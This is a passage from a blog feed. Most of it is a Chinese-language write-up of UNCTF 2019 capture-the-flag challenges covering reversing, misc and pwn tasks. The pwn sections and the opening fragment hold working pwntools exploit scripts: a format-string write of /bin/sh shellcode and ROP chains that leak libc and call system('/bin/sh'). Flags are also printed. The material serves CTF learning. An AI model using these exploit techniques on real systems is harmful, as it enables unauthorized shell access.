sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>
payload3<span class="token operator">+=</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
payload3<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>


sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[UNCTF-WP]]></title>
      <url>/2019/10/26/unctf-wp/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p><img src="https://ae01.alicdn.com/kf/H177f67923b764acd81d41f273e48f59bR.png" alt></p>
<p>有壳 且没有检测出具体壳的种类 使用ESP定律手动脱壳 </p>
<p><img src="https://ae01.alicdn.com/kf/H385b1b23dcc94510bdadae87f250ec19m.png" alt></p>
<p>已经脱掉壳了 载入dbg动态调试 单步跟几部之后发现在栈中存有flag</p>
<p><img src="https://ae01.alicdn.com/kf/H951b18e9b2884ed586e617c995e78402r.png" alt></p>
<p>得到flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p>
<h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>拖入IDA 看算法 在encode函数内发现主要算法 </p>
<p><img src="https://ae01.alicdn.com/kf/H2be8210dda1a4d9cbbb77b0c674efdcam.png" alt></p>
<p>同时在主函数结尾发现strcmp函数 推测是比较加密后的flag</p>
<p><img src="https://ae01.alicdn.com/kf/He8a1df62631d402290b70f623bf887f0p.png" alt></p>
<p>写出逆算法即可</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span><span class="token comment" spellcheck="true">//iN."K.v"w""zorhwzi</span>
    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> a2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> v5<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0x12</span><span class="token punctuation">;</span>
    cin<span class="token operator">>></span>a2<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span>
        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    cout<span class="token operator">&lt;&lt;</span>a1<span class="token punctuation">;</span>
 <span class="token punctuation">}</span> </code></pre>
<p><img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt></p>
<p>得到flag:unctf{b66_6b6_66b}</p>
<h3 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h3><p>从名字中就可以推测出是迷宫题 下载附件 拖进IDA</p>
<p><img src="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png" alt></p>
<p>v9数组明显是最初始在定义数组 原本是一个个的变量 通过手动修正可以让IDA识别成为数组 步入Step0和Step1两个函数 发现是分别对原本的迷宫进行变换 而Step2函数则是接受输入 进入走迷宫的环节 在尝试下写逆算法后选择放弃 决定使用动态调试 在Step2函数前下断 找到变换完成后的迷宫即可 </p>
<blockquote>
</blockquote>
<p>第一次变换后迷宫</p>
<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>01 00 00 00 02 00 00 00 00 00 00 00 01 00 00 00</p>
<p>ff ff ff ff 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>ff ff ff ff 01 00 00 00 ff ff ff ff 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>ff ff ff ff 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>00 00 00 00 00 00 00 00 ff ff ff ff 00 00 00 00</p>
<p>ff ff ff ff 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>ff ff ff ff ff ff ff ff 01 00 00 00 00 00 00 00</p>
<p>00 00 00 00 ff ff ff ff ff ff ff ff ff ff ff ff</p>
<p>01 00 00 00                                   </p>
<p>第二次变换后的迷宫</p>
<p>01 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>00 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
<p>00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p>
<p>01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00</p>
<p>01 00 00 00 01 00 00 00 01 00 00 00 00 00 00 00</p>
<p>01 00 00 00   </p>
<blockquote>
</blockquote>
<p>在step2函数中得知迷宫为7*7迷宫 写出脚本输出迷宫</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
using namespace std<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> mazz<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1001111101100111101110001100111100010001111111101"</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">49</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        cout<span class="token operator">&lt;&lt;</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span></code></pre>
<p><img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt></p>
<p>对照迷宫从(0,0)走到(6,6)即可 </p>
<p><img src="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png" alt></p>
<p>得到flag:UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>
<h3 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h3><p>这题应该我是非预期解… 没有进行算法逆向和动态调试 直接使用Python中的Angr库进行符号执行 得到flag</p>
<p><img src="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png" alt></p>
<p>贴出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> angr

project<span class="token operator">=</span>angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./vm"</span><span class="token punctuation">,</span>auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
state<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>
simgr<span class="token operator">=</span>project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>
simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x400BDA</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token number">0x400B96</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><p>载入IDA 通过阅读主函数 知道flag的格式为flag{****}</p>
<p><img src="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png" alt></p>
<p>步入char2hex函数查看算法 发现首先是限制输入只能为 <strong>‘0’<del>‘9’&&’a’</del>‘e’</strong> 发现后面的减法运算其实就是将字符转为数值 0~15 返回到主函数 发现在关键if判断前有一个 <strong>v9=16*v11+v10</strong> 确定是十六进制运算 <em>简单举例就是A*16+D=AD</em><br>然后将得数和程序预先设计好的checkbox数组进行比较 可以得知 程序需要的输入其实就是checkbox数组的值 </p>
<p><img src="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png" alt></p>
<p>得到flag:flag{ad461e203c7975b35e527960cbfeb06c}</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>玩就完事了= =</p>
<h3 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h3><p>下载附件 载入Stegsolve发现存在图片隐写 且隐写数据为504B0304开头 怀疑是压缩包 直接保存成ZIP </p>
<p><img src="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png" alt></p>
<p>得到一个长得和原图一模一样的图片 使用十六进制编辑器和Stegsolve都没有发现线索 在百度过后怀疑是隐水印 使用工具BlindWaterMark尝试破解 得到flag</p>
<p><img src="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png" alt></p>
<h3 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h3><p>下载附件 发现是个Python脚本 运行后输出一句</p>
<blockquote>
</blockquote>
<p>It’s a simple question. Take it easy. Don’t think too much about it.</p>
<blockquote>
</blockquote>
<p>猜测可能直接就是2019unctf 粗略阅读下代码 发现后面有base64decode 怀疑是经过base64加密后的”2019unctf” 加密后尝试 得到flag</p>
<p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p>
<h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>这真的不是社工题么… 下载后发现是mp3 音频分析后没有线索 尝试使用16进制编辑器查看 发现文件最后存有一个压缩包 </p>
<p><img src="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png" alt></p>
<p>直接修改后缀 发现压缩包需要密码  尝试爆破无果 发现压缩包备注 “qmusic 2019.7.27 17:47” 在QQ音乐上的同歌曲下的评论区寻找对应评论 得到密码 “真的上头” 解压出来一张图片 拖入十六进制编辑器 发现存在压缩包</p>
<p><img src="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png" alt></p>
<p>直接修改后缀 在压缩包 /Word/media/ 路径下发现flag图片</p>
<p><img src="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png" alt></p>
<p>得到falg:UNCTF{W3_L0v3_Unctf}</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h3><blockquote>
<p>存在漏洞:格式化字符串漏洞</p>
</blockquote>
<p>照例 下载先查保护</p>
<p><img src="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" alt></p>
<p>发现保护全关 载入IDA 发现存在格式化字符串漏洞 且输入长度不足以溢出返回地址</p>
<p><img src="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" alt></p>
<p>那么肯定是通过写入shellcode 来实现getshell 先去找一个空白的bss段地址</p>
<p><img src="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" alt></p>
<p>发现bss段地址是 0x8049b80开始的 载入IDA查看是否有读写执行权限</p>
<p><img src="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" alt></p>
<p>存在读写执行权限 那么接下来就是通过格式化字符串漏洞将shellcode 写入bss段地址 然后利用漏洞修改返回地址为bss段地址即可</p>
<blockquote>
<p>这里介绍一下pwntools 针对格式化字符串漏洞的模块 fmtstr_payload</p>
<p>这是一个函数 函数调用语法是 fmtstr_payload(格式化字符串的偏移,{地址:写入的值})</p>
<p>执行这个函数就能利用格式化字符串漏洞直接将值写入到指定地址上 比自己算不知道好用多少…</p>
</blockquote>
<p>那么直接给出脚本即可 当然 返回地址肯定还是需要先泄漏出来的</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyfmt"</span><span class="token punctuation">)</span>

read_addr<span class="token operator">=</span><span class="token number">0x80486cd</span>
puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'%27$p'</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ret_addr<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ret_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
buf_addr<span class="token operator">=</span>ret_addr<span class="token number">-0x5c</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"buf_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
bss_addr<span class="token operator">=</span><span class="token number">0x8049b80</span>



shell_code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x6850c031</span><span class="token punctuation">,</span><span class="token number">0x68732f6e</span><span class="token punctuation">,</span><span class="token number">0x622f2f68</span><span class="token punctuation">,</span><span class="token number">0x50e38969</span><span class="token punctuation">,</span><span class="token number">0x8953e289</span><span class="token punctuation">,</span><span class="token number">0xcd0bb0e1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true"># shell_code=[0xf7e652b0,0x0148bbdc,0x5e5ee6d0,0x5ec4d248,0xc1c31848,0xd1eb5348,0x8d3c2404,0x3a0f05]</span>

<span class="token keyword">while</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>shell_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token punctuation">(</span>bss_addr<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>shell_code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>



payload2<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token punctuation">{</span>ret_addr<span class="token punctuation">:</span>bss_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your message:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>


sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<blockquote>
<p>因为这里我是本地打的 试了两份shellcode 都没有打通 感觉还是shellcode的锅 </p>
</blockquote>
<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><blockquote>
<p>存在漏洞:栈溢出</p>
</blockquote>
<p>其实做下来 感觉这道题才是PWN模块的签到题…</p>
<p>其实题目已经提示 用到的知识是ROP 当然 下载附件后起码的尊敬还是要的</p>
<p><img src="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png" alt></p>
<p>然后载入IDA 发现第一个限制条件 要求v2的值是0x66666666 然后通过寄存器发现v2是存在栈上的 而且buf是可以溢出覆盖到的 那我们直接覆盖即可</p>
<p><img src="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png" alt></p>
<p>接下来跟进 sub_804853D 发现溢出点buf 通过观察栈图确定buf可以溢出到返回地址 但是问题是 这里的限制条件是返回地址不能是大于0x8050000的地址 对于执行所有Libc中的函数来说基本都是不可能的 所以我们考虑绕过方式</p>
<p><img src="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png" alt></p>
<p>通过观察函数表我们发现puts函数的地址是小于0x8050000的 所以我们通过puts函数来泄漏Libc版本 然后返回主函数进行二次利用 在第二次利用的时候 我们将puts函数的返回地址改为system即可</p>
<p>直接给出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./babyrop"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./babyrop"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.27-3ubuntu1_i386.so"</span><span class="token punctuation">)</span>
puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_addr<span class="token operator">=</span><span class="token number">0x804853d</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello CTFer!"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x66666666</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># sh.interactive()</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
puts_got<span class="token operator">=</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"binsh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png" alt></p>
<p>得到shell </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> WP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> WP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[栈溢出漏洞及利用]]></title>
      <url>/2019/10/11/zhan-yi-chu/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="简述漏洞形成"><a href="#简述漏洞形成" class="headerlink" title="简述漏洞形成"></a>简述漏洞形成</h2><blockquote>
<p>想要了解栈溢出漏洞是怎么形成的首先要先了解下在汇编层面的函数调用和栈相关的知识</p>
